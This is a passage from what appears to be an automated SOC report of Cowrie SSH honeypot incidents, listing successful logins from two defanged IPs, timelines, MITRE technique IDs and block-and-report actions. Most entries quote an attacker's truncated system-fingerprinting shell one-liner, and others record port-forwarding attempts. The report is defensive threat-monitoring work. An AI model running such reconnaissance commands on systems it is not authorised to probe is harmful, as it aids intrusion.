| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.success` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:48` | `cowrie.command.input` |
| `2026-09-01 21:39:50` | `cowrie.log.closed` |
| `2026-09-01 21:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6bd2cbb19c6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:41 |
| **Last Seen** | 2026-09-01 21:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:41:13` | `cowrie.session.connect` |
| `2026-09-01 21:41:15` | `cowrie.client.version` |
| `2026-09-01 21:41:15` | `cowrie.client.kex` |
| `2026-09-01 21:41:24` | `cowrie.login.success` |
| `2026-09-01 21:41:25` | `cowrie.session.params` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.success` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:25` | `cowrie.command.input` |
| `2026-09-01 21:41:26` | `cowrie.log.closed` |
| `2026-09-01 21:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ac4c91be70

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:42 |
| **Last Seen** | 2026-09-01 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:42:11` | `cowrie.session.connect` |
| `2026-09-01 21:42:11` | `cowrie.client.version` |
| `2026-09-01 21:42:11` | `cowrie.client.kex` |
| `2026-09-01 21:42:12` | `cowrie.login.success` |
| `2026-09-01 21:42:13` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:42:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:42:13` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-977d55517f36

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:42 |
| **Last Seen** | 2026-09-01 21:43 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:42:54` | `cowrie.session.connect` |
| `2026-09-01 21:42:56` | `cowrie.client.version` |
| `2026-09-01 21:42:56` | `cowrie.client.kex` |
| `2026-09-01 21:43:05` | `cowrie.login.success` |
| `2026-09-01 21:43:07` | `cowrie.session.params` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.success` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:07` | `cowrie.command.input` |
| `2026-09-01 21:43:08` | `cowrie.log.closed` |
| `2026-09-01 21:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-417bba65356d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:43 |
| **Last Seen** | 2026-09-01 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:43:12` | `cowrie.session.connect` |
| `2026-09-01 21:43:12` | `cowrie.client.version` |
| `2026-09-01 21:43:13` | `cowrie.client.kex` |
| `2026-09-01 21:43:14` | `cowrie.login.success` |
| `2026-09-01 21:43:14` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:43:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:43:14` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c17b536ee5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:44 |
| **Last Seen** | 2026-09-01 21:44 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:44:26` | `cowrie.session.connect` |
| `2026-09-01 21:44:28` | `cowrie.client.version` |
| `2026-09-01 21:44:28` | `cowrie.client.kex` |
| `2026-09-01 21:44:36` | `cowrie.login.success` |
| `2026-09-01 21:44:38` | `cowrie.session.params` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.success` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:38` | `cowrie.command.input` |
| `2026-09-01 21:44:40` | `cowrie.log.closed` |
| `2026-09-01 21:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f0240cde1b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:46 |
| **Last Seen** | 2026-09-01 21:46 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:46:00` | `cowrie.session.connect` |
| `2026-09-01 21:46:02` | `cowrie.client.version` |
| `2026-09-01 21:46:02` | `cowrie.client.kex` |
| `2026-09-01 21:46:11` | `cowrie.login.success` |
| `2026-09-01 21:46:12` | `cowrie.session.params` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.success` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:12` | `cowrie.command.input` |
| `2026-09-01 21:46:13` | `cowrie.log.closed` |
| `2026-09-01 21:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711789c93315

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:47 |
| **Last Seen** | 2026-09-01 21:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:47:29` | `cowrie.session.connect` |
| `2026-09-01 21:47:31` | `cowrie.client.version` |
| `2026-09-01 21:47:31` | `cowrie.client.kex` |
| `2026-09-01 21:47:37` | `cowrie.login.success` |
| `2026-09-01 21:47:39` | `cowrie.session.params` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.success` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:39` | `cowrie.command.input` |
| `2026-09-01 21:47:41` | `cowrie.log.closed` |
| `2026-09-01 21:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd61dc8c7484

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:48 |
| **Last Seen** | 2026-09-01 21:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:48:52` | `cowrie.session.connect` |
| `2026-09-01 21:48:54` | `cowrie.client.version` |
| `2026-09-01 21:48:54` | `cowrie.client.kex` |
| `2026-09-01 21:49:01` | `cowrie.login.success` |
| `2026-09-01 21:49:03` | `cowrie.session.params` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.success` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.command.input` |
| `2026-09-01 21:49:03` | `cowrie.log.closed` |
| `2026-09-01 21:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf6d5ca67b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:50 |
| **Last Seen** | 2026-09-01 21:50 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:50:25` | `cowrie.session.connect` |
| `2026-09-01 21:50:28` | `cowrie.client.version` |
| `2026-09-01 21:50:28` | `cowrie.client.kex` |
| `2026-09-01 21:50:36` | `cowrie.login.success` |
| `2026-09-01 21:50:39` | `cowrie.session.params` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.success` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.command.input` |
| `2026-09-01 21:50:39` | `cowrie.log.closed` |
| `2026-09-01 21:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783cfdfb63e6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:52 |
| **Last Seen** | 2026-09-01 21:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:52:03` | `cowrie.session.connect` |
| `2026-09-01 21:52:04` | `cowrie.client.version` |
| `2026-09-01 21:52:04` | `cowrie.client.kex` |
| `2026-09-01 21:52:11` | `cowrie.login.success` |
| `2026-09-01 21:52:13` | `cowrie.session.params` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.success` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:13` | `cowrie.command.input` |
| `2026-09-01 21:52:14` | `cowrie.log.closed` |
| `2026-09-01 21:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544958110dbc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:52 |
| **Last Seen** | 2026-09-01 21:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:52:36` | `cowrie.session.connect` |
| `2026-09-01 21:52:36` | `cowrie.client.version` |
| `2026-09-01 21:52:36` | `cowrie.client.kex` |
| `2026-09-01 21:52:37` | `cowrie.login.success` |
| `2026-09-01 21:52:37` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:52:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:52:37` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a275ac1f224

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:52 |
| **Last Seen** | 2026-09-01 21:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:52:48` | `cowrie.session.connect` |
| `2026-09-01 21:52:48` | `cowrie.client.version` |
| `2026-09-01 21:52:48` | `cowrie.client.kex` |
| `2026-09-01 21:52:49` | `cowrie.login.success` |
| `2026-09-01 21:52:49` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:52:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:52:49` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb2b4fbc8dd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:53 |
| **Last Seen** | 2026-09-01 21:53 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:53:37` | `cowrie.session.connect` |
| `2026-09-01 21:53:39` | `cowrie.client.version` |
| `2026-09-01 21:53:39` | `cowrie.client.kex` |
| `2026-09-01 21:53:47` | `cowrie.login.success` |
| `2026-09-01 21:53:48` | `cowrie.session.params` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.success` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:48` | `cowrie.command.input` |
| `2026-09-01 21:53:49` | `cowrie.log.closed` |
| `2026-09-01 21:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21086b8ed11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:55 |
| **Last Seen** | 2026-09-01 21:55 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:55:13` | `cowrie.session.connect` |
| `2026-09-01 21:55:15` | `cowrie.client.version` |
| `2026-09-01 21:55:15` | `cowrie.client.kex` |
